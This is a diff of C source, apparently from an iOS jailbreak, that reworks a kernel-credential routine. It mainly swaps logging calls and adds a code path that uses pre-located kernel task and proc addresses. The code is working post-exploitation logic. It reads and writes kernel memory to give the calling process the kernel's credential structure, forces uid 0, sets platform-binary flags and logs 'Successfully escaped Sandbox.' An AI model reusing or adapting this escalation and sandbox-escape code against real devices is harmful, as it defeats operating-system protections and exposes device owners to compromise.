@@ -38,9 +38,9 @@ out:;
 uint64_t give_creds_to_process_at_addr(uint64_t proc, uint64_t cred_addr)
 {
     uint64_t orig_creds = ReadKernel64(proc + koffset(KSTRUCT_OFFSET_PROC_UCRED));
-    LOG("orig_creds = " ADDR, orig_creds);
+    util_info("orig_creds = " ADDR, orig_creds);
     if (!ISADDR(orig_creds)) {
-        LOG("failed to get orig_creds!");
+        util_error("failed to get orig_creds!");
         return 0;
     }
     WriteKernel64(proc + koffset(KSTRUCT_OFFSET_PROC_UCRED), cred_addr);
@@ -50,9 +50,20 @@ uint64_t give_creds_to_process_at_addr(uint64_t proc, uint64_t cred_addr)
 kptr_t get_kernel_proc_struct_addr() {
     kptr_t ret = KPTR_NULL;
     kptr_t const symbol = GETOFFSET(kernel_task);
-    kptr_t const task = ReadKernel64(symbol);
-    kptr_t const bsd_info = ReadKernel64(task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
-    ret = bsd_info;
+    util_info("kernel_task symbol = " ADDR, symbol);
+    if (our_kernel_taskStruct_exportAstylez != 0) {
+        kptr_t const task = our_kernel_taskStruct_exportAstylez;//ReadKernel64(symbol);
+        util_info("task of symbol = " ADDR, task);
+        kptr_t const bsd_info = our_kernel_procStruct_exportAstylez;//ReadKernel64(task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
+        util_info("bsd_info of kernel_task is procofKern = " ADDR, bsd_info);
+        ret = bsd_info;
+    } else {
+        kptr_t const task = ReadKernel64(symbol);
+        util_info("task of symbol = " ADDR, task);
+        kptr_t const bsd_info = ReadKernel64(task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
+        util_info("bsd_info of kernel_task is procofKern = " ADDR, bsd_info);
+        ret = bsd_info;
+    }
 out:;
     return ret;
 }
@@ -61,7 +72,10 @@ kptr_t get_kernel_cred_addr()
 {
     kptr_t ret = KPTR_NULL;
     kptr_t const kernel_proc_struct_addr = get_kernel_proc_struct_addr();
+    util_info("kernel_proc_struct_addr = " ADDR, kernel_proc_struct_addr);
+
     kptr_t const kernel_ucred_struct_addr = ReadKernel64(kernel_proc_struct_addr + koffset(KSTRUCT_OFFSET_PROC_UCRED));
+    util_info("kernel_ucred_struct_addr = " ADDR, kernel_ucred_struct_addr);
     ret = kernel_ucred_struct_addr;
 out:;
     return ret;
@@ -101,29 +115,29 @@ void runShenPatch()
     uint64_t Shenanigans;
     host_t myHost;
     
-    LOG("Escaping Sandbox...");
+    util_info("Escaping Sandbox...");
     
     proc = get_proc_struct_for_pid(getpid());
     kernelCredAddr = get_kernel_cred_addr();
-    Shenanigans = ReadKernel64(GETOFFSET(shenanigans));
+    Shenanigans = ReadKernel64(GETOFFSET(shenanigans));//kernelCredAddr;//
     if (Shenanigans != kernelCredAddr) {
-        LOG("Detected corrupted shenanigans pointer.");
+        util_info("Detected corrupted shenanigans pointer.");
         Shenanigans = kernelCredAddr;
     }
-    WriteKernel64(GETOFFSET(shenanigans), ShenanigansPatch);
+    //WriteKernel64(GETOFFSET(shenanigans), ShenanigansPatch);
     uint64_t myOriginalCredAddr = myCredAddr = give_creds_to_process_at_addr(proc, kernelCredAddr);
-    LOG("myOriginalCredAddr = " ADDR, myOriginalCredAddr);
+    util_info("myOriginalCredAddr = " ADDR, myOriginalCredAddr);
     
     setuid(0);
     
     if (getuid() != 0)
     {
-        LOG("ERROR SETTING UID");
+        util_error("ERROR SETTING UID");
         exit(-1);
     }
     
     myHost = mach_host_self();
     set_platform_binary(proc, true);
     set_cs_platform_binary(proc, true);
-    LOG("Successfully escaped Sandbox.");
+    util_info("Successfully escaped Sandbox.");
 }
